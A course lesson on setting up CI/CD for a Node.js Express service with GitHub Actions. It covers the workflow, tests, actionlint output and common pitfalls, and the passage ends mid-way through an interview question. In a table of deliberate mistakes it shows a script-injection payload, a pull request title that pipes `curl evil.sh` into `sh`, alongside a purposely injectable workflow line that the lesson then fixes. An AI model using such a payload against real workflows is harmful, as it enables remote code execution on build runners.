---
title: "CI/CD with GitHub Actions"
source: written for this kit (not from geekyfrontend.in)
course: Node.js Backend Kit
tags: [geeky-frontend, nodejs-backend-kit]
---

# CI/CD with GitHub Actions

*24 min read · Updated 12 Oct 2026 · Topic 107 of 117 · added to this kit, not part of the original course*

**Source:** written for this kit — examples verified on Node v24.19.0 (and v22.23.3 for one comparison) and actionlint 1.7.12 with ShellCheck 0.11.0, Express 5.3.0, ESLint 10.12.0, supertest 7.3.1; action versions checked on their GitHub releases pages on 12 Oct 2026. No GitHub-hosted run was possible: the workflow was validated with actionlint and its steps were run locally.

---

## Say it in 30 seconds

GitHub Actions reads a YAML file in `.github/workflows` and runs your lint, test, and build on a clean machine for every push and pull request, then can build a Docker image and deploy that exact image. It exists so "it works" means the committed lockfile passed the same commands, not that it worked on one laptop. The trade-off is that a green pull request is not a protected branch: if the check is not required, or a skipped job counts as success, a broken change still reaches main.

## Why it matters

Without a pipeline, "it works" means it worked on the laptop of whoever merged last. A pull request can change a status code and the first person to notice is a client. An image can be built from a working tree with an uncommitted file, a different Node, and a `node_modules` no lockfile describes. Someone can SSH in, pull, and restart, and nobody knows which commit is running. A registry password can sit in a script in the repository, where every fork can read it.

**CI**, continuous integration, runs the same checks on every push and pull request, on a clean machine, from the committed lockfile. **CD**, continuous delivery or deployment, turns a commit that passed into an artifact, here a Docker image, and ships that exact artifact. GitHub Actions is the service built into GitHub. A YAML file in `.github/workflows/` describes the jobs. GitHub runs them on its own virtual machines, GitHub-hosted runners, or on yours, self-hosted runners.

## The concept, simply

A **workflow** is one YAML file. It says when to run, the `on:` key, for a push, a pull request, a schedule, or a button, and what to run, the `jobs:` key. Each **job** gets a fresh runner and runs its **steps** in order. A step is a shell command, `run:`, or a reusable **action**, `uses:`, which is a packaged program with inputs under `with:`. Jobs run in parallel unless one `needs:` another.

The pipeline in this lesson has three jobs:

text

```
push / pull_request
        │
        ▼
┌──────────────────────── test (matrix: Node 22, 24, 26 — three parallel jobs) ─────────┐
│ checkout → setup-node (+ npm cache) → npm ci → npm run lint → npm test → npm run build │
└────────────────────────────────────────────────────────────────────────────────────────┘
        │ all three passed, and the event is a push to main
        ▼
┌──────────────────────── image ────────────────────────────────────────────────────────┐
│ checkout → setup-buildx → login to ghcr.io (GITHUB_TOKEN) → metadata (tags)           │
│ → build-push (lesson 101's Dockerfile) → output: image digest sha256:…                 │
└────────────────────────────────────────────────────────────────────────────────────────┘
        │
        ▼  environment "production": protection rules (reviewers, branches) must pass first
┌──────────────────────── deploy ───────────────────────────────────────────────────────┐
│ reads secrets.DEPLOY_TOKEN and vars.DEPLOY_HOOK_URL → tells the platform to run       │
│ ghcr.io/<owner>/<repo>@sha256:…                                                        │
└────────────────────────────────────────────────────────────────────────────────────────┘
```

Each box is a separate machine. Nothing on disk survives from one job to the next, so the image job checks out the code again and the deploy job receives only the digest, through a job output.

## How it works

When you push a commit to a pull request, GitHub's documented behaviour is:

1. It reads every file in `.github/workflows/` at that commit and picks workflows whose `on:` matches. Here that is `pull_request`.
2. It expands `strategy.matrix`. `node: [22, 24, 26]` turns one test job into three parallel jobs. Those were the supported lines on 12 Oct 2026. The dates and the action versions are in Good to know.
3. For each job it starts a fresh runner, `runs-on: ubuntu-latest`, creates a short-lived `GITHUB_TOKEN` from the `permissions:` key, and runs the steps in order.
4. Each `run:` step is written to a temporary script. With no `shell:` key on Linux, the command is `bash -e {0}`, so the script stops at the first failing command. A non-zero exit fails the step.
5. A failed step stops the job. Later steps are skipped unless they have an `if:` such as `failure()` or `always()`. Any job that `needs:` the failed job is skipped.
6. Each job reports a **check** on the commit. Branch protection or a ruleset can require named checks before the pull request merges.

`strategy.fail-fast` defaults to `true`, so the first failing matrix job cancels the others. This workflow sets it to `false`, so a failure on Node 26 does not hide 22 and 24. `continue-on-error: true` lets an experimental entry fail without failing the run. `max-parallel` caps how many matrix jobs run at once.

**Secrets, variables, and environments** are configured in repository or organization settings, not in the YAML.

- `secrets.*` are encrypted. The runner masks their values in logs. The docs add that redaction is not guaranteed, because a transformed value such as base64 is not recognised. Secrets cannot be used directly in `if:` conditions. A workflow triggered from a fork receives none of them except `GITHUB_TOKEN`.
- `vars.*` are plain configuration, a URL or a region or a feature flag. They are not masked.
- `GITHUB_TOKEN` is created per job and expires when the job ends. This workflow gives every job `contents: read` and only the image job `packages: write`, which it needs to push to `ghcr.io`.
- An **environment** such as `production` groups secrets and variables. A job with `environment: production` waits for deployment protection rules before it is sent to a runner: required reviewers, up to six people or teams, one approval, optionally preventing self-review, a wait timer from 1 to 43,200 minutes, and deployment branches and tags, for example only `main`. The docs say the job cannot access environment secrets until a required reviewer approves. On Free, Pro, and Team plans, required reviewers and wait timers are only available for public repositories.

> ⚠️ Unverified: the environment protection rules, the approval flow, secret masking and the fork rule are GitHub-side behaviour, described here from GitHub's documentation. No GitHub repository or runner was available, so none of it was exercised.

**Caching.** `npm ci` deletes `node_modules` and installs exactly `package-lock.json`, so caching `node_modules` buys nothing. Cache npm's download cache, `~/.npm`. `actions/setup-node` with `cache: npm` hashes the lockfile into the cache key, restores `~/.npm`, and saves it after a successful job. Its README says the action does not cache `node_modules`. Since setup-node v5, caching also turns on when `package.json` has a `packageManager` field naming npm. `package-manager-cache: false` turns that off. In v6, automatic caching is limited to npm. `actions/cache` is the manual form: you set `path`, `key`, and `restore-keys` yourself when you need a key per Node version or a different directory.

Both use GitHub's cache service. A run can restore caches from its own branch and from the default branch. A cache created by a `pull_request` run is scoped to that pull request's merge ref. Entries unused for 7 days are removed. The default limit is 10 GB per repository. Since June 2026, only some triggers, including `push`, `workflow_dispatch`, and `schedule`, may write caches in the default branch's scope. `pull_request_target`, `issue_comment`, and `workflow_run` are read-only, to stop cache poisoning. The Docker layer cache in the image job, `cache-from: type=gha` and `cache-to: type=gha,mode=max`, uses the same service.

> ⚠️ Unverified: cache hits, restore order and eviction were not observed; they happen only on GitHub's runners.

**Image and deploy.** The image job runs only for a push to `main`, `github.event_name == 'push'` and `github.ref == 'refs/heads/main'`, so pull requests are tested and publish nothing. `docker/login-action` logs in to `ghcr.io` with `username` `github.actor` and `password` `secrets.GITHUB_TOKEN`. `docker/metadata-action` tags the commit with `type=sha`, and adds `latest` on the default branch with `type=raw,value=latest`. It lowercases the image name, which registries require. `docker/build-push-action` builds lesson 101's Dockerfile and outputs a `digest`, `sha256:…`, which names the exact bytes. The deploy job deploys that digest, not the tag `latest`, because a tag can move. Job concurrency `deploy-production` with `cancel-in-progress: false` runs deploys one at a time. The workflow-level concurrency cancels older runs only for pull requests. On `main`, a newer run waits, because cancelling could stop a deploy halfway. GitHub keeps at most one waiting run per group by default.

**Required checks** are separate from running CI. In branch protection or a ruleset for `main`, require status checks and add the names from `name: test (Node ${{ matrix.node }})`. "Require branches to be up to date" forces the pull request to include the latest `main`. A required check passes if its status is `successful`, `skipped`, or `neutral`. A job skipped by `if:` reports success and does not block the merge. Two workflows with the same job name make the check ambiguous. A required check that never reports, for example because a `paths:` filter skipped the workflow, stays pending and blocks the merge.

> ⚠️ Unverified: branch protection, rulesets and the exact check names that appear in the picker (expected: `test (Node 22)`, `test (Node 24)`, `test (Node 26)`) are configured in GitHub's web UI and could not be exercised here.

**Reading a failed run.** Open the red job, then the red step, and read from the first error. The step log is the command's stdout and stderr. A failing `npm test` shows the runner's report, then the step ends with the exit code. Note which matrix leg failed. Reproduce with the same `npm ci`, lint, test, and build locally. `bash -e` stops at the first failing command. A pipe such as `npm test | tee log` hides `npm test`'s exit code unless you set `shell: bash`, which adds `-o pipefail`.

> ⚠️ Unverified: the layout of GitHub's run page and the exact line the runner prints at the end of a failed step. The local equivalent (output plus exit code) is in Example 4.

## Code examples

**Example 1 — the sample app the pipeline tests.** A small Express 5 orders API, reused in lesson 104. The database and Redis clients are passed in, so tests can use fakes. The scripts are what CI calls:

json

```
{
  "name": "orders-api",
  "version": "1.0.0",
  "scripts": {
    "test": "node --test",
    "lint": "eslint .",
    "build": "node scripts/build.mjs",
    "start": "node dist/server.js",
    "migrate": "node dist/migrate.js"
  },
  "type": "module",
  "dependencies": {
    "express": "^5.3.0",
    "ioredis": "^6.0.0",
    "pg": "^8.23.1"
  },
  "devDependencies": {
    "@eslint/js": "^10.0.1",
    "eslint": "^10.12.0",
    "globals": "^17.13.0",
    "supertest": "^7.3.1"
  }
}
```

javascript

```
// src/app.js — Express 5 app; the database and cache clients are passed in,
// so tests can hand it fakes and server.js hands it real clients
import express from 'express';

export function createApp({ db, cache }) {
  const app = express();
  app.use(express.json());

  // liveness: the process can answer; no dependency is checked
  app.get('/healthz', (req, res) => res.json({ ok: true }));

  // readiness: Postgres and Redis must both answer
  app.get('/readyz', async (req, res) => {
    const checks = {};
    try {
      await db.query('SELECT 1');
      checks.postgres = 'up';
    } catch (err) {
      checks.postgres = `down (${err.code ?? err.message})`;
    }
    try {
      checks.redis = (await cache.ping()) === 'PONG' ? 'up' : 'down';
    } catch (err) {
      checks.redis = `down (${err.message})`;
    }
    const ready = checks.postgres === 'up' && checks.redis === 'up';
    res.status(ready ? 200 : 503).json({ ready, checks });
  });

  app.get('/orders', async (req, res) => {
    const { rows } = await db.query('SELECT id, item, qty FROM orders ORDER BY id');
    res.json(rows);
  });

  app.post('/orders', async (req, res) => {
    // Express 5: req.body is undefined when the request has no body
    const { item, qty } = req.body ?? {};
    if (typeof item !== 'string' || !Number.isInteger(qty) || qty < 1) {
      return res.status(422).json({ error: 'item (string) and qty (integer >= 1) are required' });
    }
    const { rows } = await db.query(
      'INSERT INTO orders (item, qty) VALUES ($1, $2) RETURNING id, item, qty',
      [item, qty],
    );
    res.status(201).json(rows[0]);
  });

  return app;
}
```

javascript

```
// test/app.test.js — node:test + supertest against fake clients (no real services)
import { test } from 'node:test';
import assert from 'node:assert/strict';
import request from 'supertest';
import { createApp } from '../src/app.js';

const db = { query: async () => ({ rows: [{ id: 1, item: 'pen', qty: 2 }] }) };
const cache = { ping: async () => 'PONG' };
const redisDown = { ping: async () => { throw new Error('connect ECONNREFUSED'); } };

test('GET /healthz answers without touching dependencies', async () => {
  const res = await request(createApp({ db: null, cache: null })).get('/healthz');
  assert.equal(res.status, 200);
});

test('GET /readyz is 200 when Postgres and Redis answer', async () => {
  const res = await request(createApp({ db, cache })).get('/readyz');
  assert.equal(res.status, 200);
  assert.deepEqual(res.body.checks, { postgres: 'up', redis: 'up' });
});

test('GET /readyz is 503 when Redis is down', async () => {
  const res = await request(createApp({ db, cache: redisDown })).get('/readyz');
  assert.equal(res.status, 503);
  assert.equal(res.body.checks.redis, 'down (connect ECONNREFUSED)');
});

test('POST /orders without a body is 422, not a crash', async () => {
  const res = await request(createApp({ db, cache })).post('/orders');
  assert.equal(res.status, 422);
});
```

javascript

```
// eslint.config.js — ESLint 10 flat config
import js from '@eslint/js';
import globals from 'globals';
import { defineConfig, globalIgnores } from 'eslint/config';

export default defineConfig([
  globalIgnores(['dist/', 'coverage/']),
  js.configs.recommended,
  { languageOptions: { sourceType: 'module', globals: globals.node } },
]);
```

javascript

```
// scripts/build.mjs — this sample is plain JavaScript, so "build" only copies
// src/ to dist/ (the layout lesson 101's Dockerfile expects). A TypeScript
// project would run tsc here instead.
import { rmSync, cpSync, readdirSync } from 'node:fs';

rmSync('dist', { recursive: true, force: true });
cpSync('src', 'dist', { recursive: true });
console.log(`built dist/: ${readdirSync('dist').sort().join(', ')}`);
```

`src/server.js` and `src/migrate.js` are in lesson 104, Examples 1 and 2. The repository root also holds lesson 101's corrected Dockerfile (`node:24` builder, `node:24-slim` runtime, comments on their own lines) and its `.dockerignore`.

**Example 2 — the complete workflow, validated with actionlint.**

yaml

```
# .github/workflows/ci.yml
name: CI

on:
  push:
    branches: [main]
  pull_request:
  workflow_dispatch:

# least privilege for every job; jobs that need more ask for it
permissions:
  contents: read

# a new push to a PR cancels that PR's older run. On main a running run is
# not cancelled (it may be deploying); the newer run waits as "pending"
concurrency:
  group: ${{ github.workflow }}-${{ github.ref }}
  cancel-in-progress: ${{ github.event_name == 'pull_request' }}

env:
  REGISTRY: ghcr.io
  IMAGE_NAME: ${{ github.repository }}

jobs:
  test:
    name: test (Node ${{ matrix.node }})
    runs-on: ubuntu-latest
    timeout-minutes: 15
    strategy:
      # let every Node line finish, so one failure does not hide another
      fail-fast: false
      matrix:
        node: [22, 24, 26]
    steps:
      - uses: actions/checkout@v7
      - uses: actions/setup-node@v7
        with:
          node-version: ${{ matrix.node }}
          # caches ~/.npm keyed on package-lock.json; npm ci still runs
          cache: npm
      - run: npm ci
      - run: npm run lint
      - run: npm test
      - run: npm run build

  image:
    needs: test
    if: github.event_name == 'push' && github.ref == 'refs/heads/main'
    runs-on: ubuntu-latest
    permissions:
      contents: read
      # GITHUB_TOKEN may push to ghcr.io only with this
      packages: write
    outputs:
      digest: ${{ steps.push.outputs.digest }}
    steps:
      - uses: actions/checkout@v7
      - uses: docker/setup-buildx-action@v4
      - uses: docker/login-action@v4
        with:
          registry: ${{ env.REGISTRY }}
          username: ${{ github.actor }}
          password: ${{ secrets.GITHUB_TOKEN }}
      - id: meta
        uses: docker/metadata-action@v6
        with:
          images: ${{ env.REGISTRY }}/${{ env.IMAGE_NAME }}
          tags: |
            type=sha
            type=raw,value=latest,enable={{is_default_branch}}
      - id: push
        uses: docker/build-push-action@v7
        with:
          context: .
          push: true
          tags: ${{ steps.meta.outputs.tags }}
          labels: ${{ steps.meta.outputs.labels }}
          cache-from: type=gha
          cache-to: type=gha,mode=max

  deploy:
    needs: image
    runs-on: ubuntu-latest
    # protection rules on "production" (reviewers, branches) run before this job starts
    environment:
      name: production
      url: ${{ vars.APP_URL }}
    # never cancel a deploy half-way; queue the next one instead
    concurrency:
      group: deploy-production
      cancel-in-progress: false
    steps:
      - name: Tell the platform to run the new image
        env:
          IMAGE: ${{ env.REGISTRY }}/${{ env.IMAGE_NAME }}@${{ needs.image.outputs.digest }}
          DEPLOY_HOOK_URL: ${{ vars.DEPLOY_HOOK_URL }}
          DEPLOY_TOKEN: ${{ secrets.DEPLOY_TOKEN }}
        run: |
          curl --fail-with-body -sS -X POST "$DEPLOY_HOOK_URL" \
            -H "Authorization: Bearer $DEPLOY_TOKEN" \
            -H 'Content-Type: application/json' \
            -d "{\"image\":\"$IMAGE\"}"
```

The deploy step passes `secrets.*` and `vars.*` to the script through `env:` and uses `"$VAR"` inside it, instead of writing `${{ secrets.DEPLOY_TOKEN }}` into the script text. An expression in `run:` is pasted into the script before bash runs it, so a value containing quotes or `$(…)` would become code. actionlint flags this pattern for untrusted inputs (Example 5).

actionlint (1.7.12, the release binary, sha256 checked against `actionlint_1.7.12_checksums.txt`) parses the workflow, type-checks every `${{ }}` expression and runs ShellCheck on each `run:` script when `shellcheck` is on `PATH`. It prints nothing and exits 0 when it finds no problems:

bash

```
$ actionlint -version
1.7.12
installed by downloading from release page
built with go1.26.1 compiler for linux/amd64
$ actionlint -verbose .github/workflows/ci.yml
verbose: Linting .github/workflows/ci.yml
verbose: Found 0 parse errors in 0 ms for .github/workflows/ci.yml
verbose: Rule "pyflakes" was disabled: exec: "pyflakes": executable file not found in $PATH
verbose: Found total 0 errors in 56 ms for .github/workflows/ci.yml
$ echo $?
0
```

Run with no file argument, actionlint looks for the repository root and fails outside a git repository (`no project was found in any parent directories … check workflows directory is put correctly in your Git repository`, exit code 3). Passing the file path works anywhere. Without `shellcheck` on `PATH`, the verbose output says `Rule "shellcheck" was disabled`, and shell bugs inside `run:` go unchecked.

> ⚠️ Unverified: everything that happens when GitHub runs this workflow (the matrix jobs, the cache, the GHCR login and push, the environment gate, the deploy call). actionlint checks syntax, expressions and scripts; it does not run anything.

**Example 3 — the `test` job's steps, run locally.** `ci-local.sh` runs the four `run:` steps in order, each in its own `bash -e` process like a runner step, and stops at the first failure:

bash

```
#!/usr/bin/env bash
# ci-local.sh — runs the test job's `run:` steps in order, each in its own
# `bash -e` process like a runner step; stops at the first step that fails
for step in "npm ci" "npm run lint" "npm test" "npm run build"; do
  echo "=== step: $step"
  bash -e -c "$step"
  code=$?
  if [ "$code" -ne 0 ]; then
    echo "=== step '$step' exited with code $code; later steps are skipped"
    exit "$code"
  fi
done
echo "=== all steps passed"
```

bash

```
$ bash ci-local.sh
=== step: npm ci

added 182 packages, and audited 183 packages in 2s

51 packages are looking for funding
  run `npm fund` for details

found 0 vulnerabilities
=== step: npm run lint

> orders-api@1.0.0 lint
> eslint .

=== step: npm test

> orders-api@1.0.0 test
> node --test

✔ GET /healthz answers without touching dependencies (36.727367ms)
✔ GET /readyz is 200 when Postgres and Redis answer (8.929361ms)
✔ GET /readyz is 503 when Redis is down (5.149434ms)
✔ POST /orders without a body is 422, not a crash (5.440299ms)
ℹ tests 4
ℹ suites 0
ℹ pass 4
ℹ fail 0
ℹ cancelled 0
ℹ skipped 0
ℹ todo 0
ℹ duration_ms 301.024112
=== step: npm run build

> orders-api@1.0.0 build
> node scripts/build.mjs

built dist/: app.js, migrate.js, server.js
=== all steps passed
$ echo $?
0
```

ESLint prints nothing when the code is clean. That is normal, not a sign that it skipped the files.

**Example 4 — edge case: reading a failed test step.** Someone changes the validation response from 422 to 400 (`return res.status(400)…` in `src/app.js`) and pushes. The same local run:

bash

```
$ bash ci-local.sh
=== step: npm ci
…
=== step: npm run lint

> orders-api@1.0.0 lint
> eslint .

=== step: npm test

> orders-api@1.0.0 test
> node --test

✔ GET /healthz answers without touching dependencies (49.00336ms)
✔ GET /readyz is 200 when Postgres and Redis answer (8.127461ms)
✔ GET /readyz is 503 when Redis is down (5.145258ms)
✖ POST /orders without a body is 422, not a crash (7.094816ms)
ℹ tests 4
ℹ suites 0
ℹ pass 3
ℹ fail 1
ℹ cancelled 0
ℹ skipped 0
ℹ todo 0
ℹ duration_ms 341.252598

✖ failing tests:

test at test/app.test.js:28:1
✖ POST /orders without a body is 422, not a crash (7.094816ms)
  AssertionError [ERR_ASSERTION]: Expected values to be strictly equal:
  
  400 !== 422
  
      at TestContext.<anonymous> (file:///…/test/app.test.js:30:10)
      at process.processTicksAndRejections (node:internal/process/task_queues:104:5)
      at async Test.run (node:internal/test_runner/test:1389:7)
      at async Test.processPendingSubtests (node:internal/test_runner/test:960:7) {
    generatedMessage: true,
    code: 'ERR_ASSERTION',
    actual: 400,
    expected: 422,
    operator: 'strictEqual',
    diff: 'simple'
  }
=== step 'npm test' exited with code 1; later steps are skipped
$ echo $?
1
$ ls dist
ls: cannot access 'dist': No such file or directory
```

How to read it, top to bottom:

1. **Which step.** `npm test` failed; `npm ci` and lint passed. In the GitHub UI this is the expanded red step.
2. **Which test.** `✖ POST /orders without a body is 422, not a crash`, defined at `test/app.test.js:28:1`.
3. **What differed.** `actual: 400, expected: 422`, at `app.test.js:30:10`, the `assert.equal(res.status, 422)` line.
4. **The exit code.** `node --test` exits 1 when any test fails. That non-zero code is the only thing the runner uses to decide that the step failed.
5. **What did not run.** `npm run build` was skipped, so no `dist/` exists, and on GitHub the `image` and `deploy` jobs would be skipped because they `need` `test`.

The same run under **Node 22** looks different. Since Node v23.0.0, `node --test` uses the `spec` reporter when stdout is not a terminal (changed in v23.0.0; before that it used `tap`). A CI log is not a terminal, so the Node 22 matrix leg prints TAP:

bash

```
$ node --version
v22.23.3
$ node --test
TAP version 13
…
# Subtest: POST /orders without a body is 422, not a crash
not ok 4 - POST /orders without a body is 422, not a crash
  ---
  duration_ms: 10.308608
  type: 'test'
  location: '/…/test/app.test.js:28:1'
  failureType: 'testCodeFailure'
  error: |-
    Expected values to be strictly equal:
    
    400 !== 422
    
  code: 'ERR_ASSERTION'
  name: 'AssertionError'
  expected: 422
  actual: 400
  operator: 'strictEqual'
…
1..4
# tests 4
# suites 0
# pass 3
# fail 1
…
$ echo $?
1
```

Add `--test-reporter=spec` to the `test` script if you want the same format on every matrix leg.

A lint failure looks like this (an unused import added to `src/app.js`):

bash

```
$ npm run lint

> orders-api@1.0.0 lint
> eslint .


/…/src/app.js
  4:10  error  'randomUUID' is defined but never used  no-unused-vars

✖ 1 problem (1 error, 0 warnings)

$ echo $?
1
```

**Example 5 — a broken workflow and actionlint's real errors.** Six deliberate mistakes:

yaml

```
# .github/workflows/ci-broken.yml — six deliberate mistakes
name: CI

on:
  pull_request:

jobs:
  test:
    runs-on: ubuntu-latst
    strategy:
      matrix:
        node: [22, 24, 26]
    steps:
      - uses: actions/checkout@v7
      - uses: actions/setup-node@v7
        with:
          node-version: ${{ matrix.nodes }}
          cache: npm
      - run: npm ci
      - run: echo "Testing ${{ github.event.pull_request.title }}"
      - run: npm test

  deploy:
    needs: tests
    if: secrets.DEPLOY_TOKEN != ''
    runs-on: ubuntu-latest
    steps:
      - run: echo 'deploying $GITHUB_SHA'
      - run: ./deploy.sh
```

bash

```
$ actionlint .github/workflows/ci-broken.yml
.github/workflows/ci-broken.yml:9:14: label "ubuntu-latst" is unknown. available labels are "windows-latest", "windows-latest-8-cores", "windows-2025", "windows-2025-vs2026", "windows-2022", "windows-11-arm", "ubuntu-slim", "ubuntu-latest", "ubuntu-latest-4-cores", "ubuntu-latest-8-cores", "ubuntu-latest-16-cores", "ubuntu-24.04", "ubuntu-24.04-arm", "ubuntu-22.04", "ubuntu-22.04-arm", "macos-latest", "macos-latest-xlarge", "macos-latest-large", "macos-26-intel", "macos-26-xlarge", "macos-26-large", "macos-26", "macos-15-intel", "macos-15-xlarge", "macos-15-large", "macos-15", "macos-14-xlarge", "macos-14-large", "macos-14", "self-hosted", "x64", "arm", "arm64", "linux", "macos", "windows". if it is a custom label for self-hosted runner, set list of labels in actionlint.yaml config file [runner-label]
  |
9 |     runs-on: ubuntu-latst
  |              ^~~~~~~~~~~~
.github/workflows/ci-broken.yml:17:29: property "nodes" is not defined in object type {node: number} [expression]
   |
17 |           node-version: ${{ matrix.nodes }}
   |                             ^~~~~~~~~~~~
.github/workflows/ci-broken.yml:20:32: "github.event.pull_request.title" is potentially untrusted. avoid using it directly in inline scripts. instead, pass it through an environment variable. see https://docs.github.com/en/actions/reference/security/secure-use#good-practices-for-mitigating-script-injection-attacks for more details [expression]
   |
20 |       - run: echo "Testing ${{ github.event.pull_request.title }}"
   |                                ^~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
.github/workflows/ci-broken.yml:23:3: job "deploy" needs job "tests" which does not exist in this workflow [job-needs]
   |
23 |   deploy:
   |   ^~~~~~~
.github/workflows/ci-broken.yml:25:9: context "secrets" is not allowed here. available contexts are "github", "inputs", "needs", "vars". see https://docs.github.com/en/actions/learn-github-actions/contexts#context-availability for more details [expression]
   |
25 |     if: secrets.DEPLOY_TOKEN != ''
   |         ^~~~~~~~~~~~~~~~~~~~
.github/workflows/ci-broken.yml:28:9: shellcheck reported issue in this script: SC2016:info:1:6: Expressions don't expand in single quotes, use double quotes for that [shellcheck]
   |
28 |       - run: echo 'deploying $GITHUB_SHA'
   |         ^~~~
$ echo $?
1
```

What each one would have done on GitHub:

| Line | Mistake | On GitHub |
|---|---|---|
| 9 | Typo in the runner label | The job waits for a runner with that label |
| 17 | `matrix.nodes` instead of `matrix.node` | The expression gives an empty string, so setup-node gets no version |
| 20 | PR title pasted into a script | Script injection: a title like `"; curl evil.sh \| sh; "` runs as code |
| 24 | `needs: tests` | The workflow is invalid and does not start |
| 25 | `secrets` in a job `if:` | Not allowed there (the docs suggest a job-level `env` variable instead) |
| 28 | `$GITHUB_SHA` in single quotes | Prints the literal text `$GITHUB_SHA` |

> ⚠️ Unverified: the "On GitHub" column is the documented or expected behaviour, not an observed run.

Fix line 20 the same way as the deploy step in Example 2: `env: { TITLE: ${{ github.event.pull_request.title }} }` and `run: echo "Testing $TITLE"`.

**Example 6 — edge case: actionlint does not know action versions newer than itself.** actionlint checks `with:` inputs against a table of popular actions built into the binary. actionlint 1.7.12 was released on 2026-03-30, before setup-node v7 (2026-07-14):

yaml

```
on: push
jobs:
  a:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/setup-node@v7
        with:
          node_version: 24
      - uses: actions/setup-node@v4
        with:
          node_version: 24
      - uses: actions/checkout@v9
```

bash

```
$ actionlint .github/workflows/inputs.yml
.github/workflows/inputs.yml:11:11: input "node_version" is not defined in action "actions/setup-node@v4". available inputs are "always-auth", "architecture", "cache", "cache-dependency-path", "check-latest", "mirror", "mirror-token", "node-version", "node-version-file", "registry-url", "scope", "token" [action]
   |
11 |           node_version: 24
   |           ^~~~~~~~~~~~~
$ echo $?
1
```

The same typo (`node_version` for `node-version`) is caught on `@v4` but not on `@v7`, and `actions/checkout@v9`, a tag that does not exist, passes as well. A clean actionlint run does not prove that every input name is right for a newer action. Check the inputs against that version's `action.yml` (setup-node v7's inputs are `node-version`, `node-version-file`, `architecture`, `check-latest`, `registry-url`, `scope`, `token`, `cache`, `package-manager-cache`, `cache-dependency-path`, `mirror`, `mirror-token`), and update actionlint when a new major of an action you use ships.

**Example 7 — `actions/cache` instead of setup-node's `cache:`.** The key includes the Node version and the lockfile hash. `restore-keys` falls back to the newest cache for the same Node version when the lockfile changed. `npm ci` always runs, because `~/.npm` is only a download cache.

yaml

```
# .github/workflows/ci-actions-cache.yml — the test job with actions/cache instead of setup-node's cache
name: CI (actions/cache)
on: [push, pull_request]
permissions:
  contents: read
jobs:
  test:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        node: [22, 24, 26]
    steps:
      - uses: actions/checkout@v7
      - uses: actions/setup-node@v7
        with:
          node-version: ${{ matrix.node }}
          # no setup-node cache here: actions/cache below owns ~/.npm
          package-manager-cache: false
      - id: npm-cache
        uses: actions/cache@v6
        with:
          path: ~/.npm
          key: npm-${{ runner.os }}-node${{ matrix.node }}-${{ hashFiles('package-lock.json') }}
          restore-keys: |
            npm-${{ runner.os }}-node${{ matrix.node }}-
      - name: Show whether the key matched exactly
        env:
          HIT: ${{ steps.npm-cache.outputs.cache-hit }}
        run: echo "exact cache hit = $HIT"
      - run: npm ci
      - run: npm test
```

bash

```
$ actionlint .github/workflows/ci-actions-cache.yml
$ echo $?
0
```

`cache-hit` is `true` only when the primary `key` matched; a `restore-keys` match gives `false` (actions/cache README). In the first draft of this file, the "show" step was the one-liner `- run: echo "exact cache hit: ${{ steps.npm-cache.outputs.cache-hit }}"`, and actionlint rejected the whole file:

bash

```
$ actionlint .github/workflows/ci-actions-cache.yml
.github/workflows/ci-actions-cache.yml:26:34: could not parse as YAML: mapping values are not allowed in this context [syntax-check]
   |
26 |       - run: echo "exact cache hit: ${{ steps.npm-cache.outputs.cache-hit }}"
   |                                  ^~
$ echo $?
1
```

The value of `run:` starts with `echo`, so YAML reads it as a plain scalar, and a plain scalar may not contain `: ` (colon and space). The quotes inside do not help, because they are not at the start of the value. Use a block scalar (`run: |`) or quote the whole value. This is a YAML rule, not an actionlint rule, so any YAML parser rejects the file, including GitHub's.

## Common mistakes & gotchas

- **`npm install` in CI.** It may update the lockfile. `npm ci` installs the lockfile and fails if `package.json` and the lockfile disagree.
- **Caching `node_modules` and skipping `npm ci`.** `npm ci` deletes `node_modules` anyway, and a tree built for another Node can hide native-module breakage. Cache `~/.npm`.
- **A matrix that includes an end-of-life Node.** On 12 Oct 2026 the supported lines were 22, 24, and 26. Node 20 ended on 2026-04-30.
- **`fail-fast` left at `true`.** One failing leg cancels the others.
- **Expressions pasted into `run:`.** `${{ github.event.pull_request.title }}` inside a script is script injection. Pass it through `env:` and quote `"$VAR"`.
- **`secrets` in `if:`.** Not allowed. Map the secret to a job-level `env` variable and test that.
- **No `permissions:` key.** The token gets the repository default. Set `contents: read` at the top and add `packages: write` only on the job that pushes.
- **`cancel-in-progress: true` on the deploy branch.** A newer push can cancel a deploy halfway. Cancel only pull request runs. Give deploys their own group.
- **The same concurrency group in two workflows.** Include `${{ github.workflow }}` in the name.
- **Deploying `:latest`.** A tag can move. Deploy the digest from `build-push-action`.
- **A required check that never reports.** A `paths:` filter leaves it pending and blocks the merge. A job skipped by `if:` reports success and lets the merge through.
- **Trusting actionlint on action majors newer than the linter.** actionlint 1.7.12 does not know setup-node v7's inputs.
- **`: ` inside a one-line `run:`.** YAML rejects a plain scalar that contains colon-space. Use `run: |`.
- **A pipe hiding a failure.** With default `bash -e`, `npm test | tee test.log` can succeed when `npm test` fails. Set `shell: bash` so pipefail is on.

## Best practices

- **Keep CI commands in `package.json` scripts** so the workflow and a laptop run the same lint, test, and build.
- **Test every supported Node line** with `fail-fast: false`, and build the image from one line, the Dockerfile's `node:24`.
- **Least privilege on `GITHUB_TOKEN`:** `contents: read` at the top, `packages: write` only in the image job.
- **Secrets in an environment** with required reviewers and a branch rule of `main` only. Use `vars.*` for settings that are not secret.
- **Build once, deploy the digest.** Tags can include `sha-<commit>` and `latest`. The deploy job uses `image@sha256:…`.
- **Run actionlint with ShellCheck**, and keep it updated. It only knows action versions that existed when it was released.
- **Pin actions** to a major tag, or to a full commit SHA with Dependabot opening updates.
- **Require the test check** in branch protection or a ruleset, with job names that are unique across workflows.
- **Set `timeout-minutes`** so a hung test does not sit until the default 6-hour limit.
- **Pick one test reporter** if logs from different Node versions should look the same.

## ⭐ Interview lens

> **Q: “Walk me through a CI/CD pipeline for a Node service.”**  
